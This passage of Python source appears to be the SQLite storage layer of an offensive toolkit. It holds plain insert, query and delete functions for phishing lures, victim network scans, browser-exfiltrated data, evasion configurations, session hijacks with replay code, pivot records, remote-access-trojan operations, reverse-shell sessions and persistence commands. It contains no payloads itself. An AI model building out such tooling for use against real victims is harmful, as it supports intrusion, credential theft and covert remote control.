    cursor.execute('''
        INSERT INTO saved_lures (name, category, lure_type, subject, body, variables, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    ''', (name, category, lure_type, subject, body, json.dumps(variables or {}), now))
    lure_id = cursor.lastrowid
    conn.commit()
    conn.close()
    return lure_id


def get_saved_lures():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM saved_lures ORDER BY created_at DESC')
    rows = cursor.fetchall()
    conn.close()
    return [dict(row) for row in rows]


def delete_saved_lure(lure_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('DELETE FROM saved_lures WHERE id = ?', (lure_id,))
    conn.commit()
    conn.close()


# ===== NETWORK DISCOVERIES =====

def save_network_discovery(victim_ip, scan_type, discovered_hosts, ports=None, services=None, raw_data=None):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    now = datetime.now().isoformat()
    cursor.execute('''
        INSERT INTO network_discoveries (victim_ip, scan_type, discovered_hosts, ports, services, raw_data, timestamp)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    ''', (victim_ip, scan_type, json.dumps(discovered_hosts), json.dumps(ports or []),
          json.dumps(services or []), json.dumps(raw_data or {}), now))
    disc_id = cursor.lastrowid
    conn.commit()
    conn.close()
    return disc_id


def get_network_discoveries(victim_ip=None, limit=100):
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    if victim_ip:
        cursor.execute('SELECT * FROM network_discoveries WHERE victim_ip = ? ORDER BY timestamp DESC LIMIT ?', (victim_ip, limit))
    else:
        cursor.execute('SELECT * FROM network_discoveries ORDER BY timestamp DESC LIMIT ?', (limit,))
    rows = cursor.fetchall()
    conn.close()
    return [dict(row) for row in rows]


# ===== BROWSER EXFILTRATION =====

def save_browser_exfil(victim_ip, session_id, data_type, data, metadata=None):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    now = datetime.now().isoformat()
    cursor.execute('''
        INSERT INTO browser_exfil (victim_ip, session_id, data_type, data, metadata, timestamp)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (victim_ip, session_id, data_type, json.dumps(data), json.dumps(metadata or {}), now))
    exfil_id = cursor.lastrowid
    conn.commit()
    conn.close()
    return exfil_id


def get_browser_exfil(victim_ip=None, data_type=None, limit=200):
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    query = 'SELECT * FROM browser_exfil'
    params = []
    conditions = []
    if victim_ip:
        conditions.append('victim_ip = ?')
        params.append(victim_ip)
    if data_type:
        conditions.append('data_type = ?')
        params.append(data_type)
    if conditions:
        query += ' WHERE ' + ' AND '.join(conditions)
    query += ' ORDER BY timestamp DESC LIMIT ?'
    params.append(limit)
    cursor.execute(query, params)
    rows = cursor.fetchall()
    conn.close()
    return [dict(row) for row in rows]


# ===== EVASION CONFIGURATIONS =====

def save_evasion_config(name, config, stealth_score, stealth_grade, traffic_profile, timing_profile, created_by):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    now = datetime.now().isoformat()
    cursor.execute('''
        INSERT INTO evasion_configs (name, config, stealth_score, stealth_grade, traffic_profile, timing_profile, created_by, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (name, json.dumps(config), stealth_score, stealth_grade, traffic_profile, timing_profile, created_by, now))
    config_id = cursor.lastrowid
    conn.commit()
    conn.close()
    return config_id


def get_evasion_configs(limit=50):
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM evasion_configs ORDER BY created_at DESC LIMIT ?', (limit,))
    rows = cursor.fetchall()
    conn.close()
    return [dict(row) for row in rows]


def delete_evasion_config(config_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('DELETE FROM evasion_configs WHERE id = ?', (config_id,))
    conn.commit()
    conn.close()


# ===== THREAT INTELLIGENCE =====

def save_threat_intel(intel_type, target, result, threat_score, threat_level, created_by):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    now = datetime.now().isoformat()
    cursor.execute('''
        INSERT INTO threat_intel (intel_type, target, result, threat_score, threat_level, created_by, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    ''', (intel_type, target, json.dumps(result), threat_score, threat_level, created_by, now))
    intel_id = cursor.lastrowid
    conn.commit()
    conn.close()
    return intel_id


def get_threat_intel(intel_type=None, limit=100):
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    if intel_type:
        cursor.execute('SELECT * FROM threat_intel WHERE intel_type = ? ORDER BY created_at DESC LIMIT ?', (intel_type, limit))
    else:
        cursor.execute('SELECT * FROM threat_intel ORDER BY created_at DESC LIMIT ?', (limit,))
    rows = cursor.fetchall()
    conn.close()
    return [dict(row) for row in rows]


def delete_threat_intel(intel_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('DELETE FROM threat_intel WHERE id = ?', (intel_id,))
    conn.commit()
    conn.close()


# ===== SESSION HIJACKS =====

def save_session_hijack(victim_ip, session_data, token_count, critical_tokens, hijack_feasibility, risk_score, replay_code=None):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    now = datetime.now().isoformat()
    cursor.execute('''
        INSERT INTO session_hijacks (victim_ip, session_data, token_count, critical_tokens, hijack_feasibility, risk_score, replay_code, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (victim_ip, json.dumps(session_data), token_count, critical_tokens, hijack_feasibility, risk_score, json.dumps(replay_code or {}), now))
    hijack_id = cursor.lastrowid
    conn.commit()
    conn.close()
    return hijack_id


def get_session_hijacks(victim_ip=None, limit=100):
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    if victim_ip:
        cursor.execute('SELECT * FROM session_hijacks WHERE victim_ip = ? ORDER BY created_at DESC LIMIT ?', (victim_ip, limit))
    else:
        cursor.execute('SELECT * FROM session_hijacks ORDER BY created_at DESC LIMIT ?', (limit,))
    rows = cursor.fetchall()
    conn.close()
    return [dict(row) for row in rows]


def delete_session_hijack(hijack_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('DELETE FROM session_hijacks WHERE id = ?', (hijack_id,))
    conn.commit()
    conn.close()


# ===== PIVOT RECORDS =====

def save_pivot_record(record_type, name, data, host_count=0, path_count=0, kill_chain_coverage=0, created_by='operator'):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    now = datetime.now().isoformat()
    cursor.execute('''
        INSERT INTO pivot_records (record_type, name, data, host_count, path_count, kill_chain_coverage, created_by, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (record_type, name, json.dumps(data), host_count, path_count, kill_chain_coverage, created_by, now))
    record_id = cursor.lastrowid
    conn.commit()
    conn.close()
    return record_id


def get_pivot_records(record_type=None, limit=50):
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    if record_type:
        cursor.execute('SELECT * FROM pivot_records WHERE record_type = ? ORDER BY created_at DESC LIMIT ?', (record_type, limit))
    else:
        cursor.execute('SELECT * FROM pivot_records ORDER BY created_at DESC LIMIT ?', (limit,))
    rows = cursor.fetchall()
    conn.close()
    return [dict(row) for row in rows]


def delete_pivot_record(record_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('DELETE FROM pivot_records WHERE id = ?', (record_id,))
    conn.commit()
    conn.close()


# ===== RAT OPERATIONS =====

def save_rat_operation(operation_type, name, target_os='windows', parameters=None, result=None, risk_level='medium', mitre_id='', created_by='operator'):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    now = datetime.now().isoformat()
    cursor.execute('''
        INSERT INTO rat_operations (operation_type, name, target_os, parameters, result, risk_level, mitre_id, created_by, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', (operation_type, name, target_os, json.dumps(parameters or {}), json.dumps(result or {}), risk_level, mitre_id, created_by, now))
    op_id = cursor.lastrowid
    conn.commit()
    conn.close()
    return op_id


def get_rat_operations(operation_type=None, limit=100):
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    if operation_type:
        cursor.execute('SELECT * FROM rat_operations WHERE operation_type = ? ORDER BY created_at DESC LIMIT ?', (operation_type, limit))
    else:
        cursor.execute('SELECT * FROM rat_operations ORDER BY created_at DESC LIMIT ?', (limit,))
    rows = cursor.fetchall()
    conn.close()
    return [dict(row) for row in rows]


def delete_rat_operation(op_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('DELETE FROM rat_operations WHERE id = ?', (op_id,))
    conn.commit()
    conn.close()


def save_rat_shell(session_name, shell_type, lhost, lport, target_host='', payload='', encoding='none'):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    now = datetime.now().isoformat()
    cursor.execute('''
        INSERT INTO rat_shell_sessions (session_name, shell_type, lhost, lport, target_host, payload, encoding, status, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, 'generated', ?)
    ''', (session_name, shell_type, lhost, lport, target_host, payload, encoding, now))
    shell_id = cursor.lastrowid
    conn.commit()
    conn.close()
    return shell_id


def get_rat_shells(limit=50):
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM rat_shell_sessions ORDER BY created_at DESC LIMIT ?', (limit,))
    rows = cursor.fetchall()
    conn.close()
    return [dict(row) for row in rows]


def delete_rat_shell(shell_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('DELETE FROM rat_shell_sessions WHERE id = ?', (shell_id,))
    conn.commit()
    conn.close()


def save_rat_persistence(target_os, method, install_cmd, cleanup_cmd, risk_level, survival):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    now = datetime.now().isoformat()
    cursor.execute('''
        INSERT INTO rat_persistence (target_os, method, install_cmd, cleanup_cmd, risk_level, survival, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    ''', (target_os, method, install_cmd, cleanup_cmd, risk_level, survival, now))
    p_id = cursor.lastrowid
    conn.commit()
    conn.close()
    return p_id


def get_rat_persistence(target_os=None, limit=50):
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    if target_os:
        cursor.execute('SELECT * FROM rat_persistence WHERE target_os = ? ORDER BY created_at DESC LIMIT ?', (target_os, limit))
    else:
        cursor.execute('SELECT * FROM rat_persistence ORDER BY created_at DESC LIMIT ?', (limit,))
    rows = cursor.fetchall()
    conn.close()
    return [dict(row) for row in rows]


def delete_rat_persistence(p_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('DELETE FROM rat_persistence WHERE id = ?', (p_id,))
    conn.commit()
    conn.close()
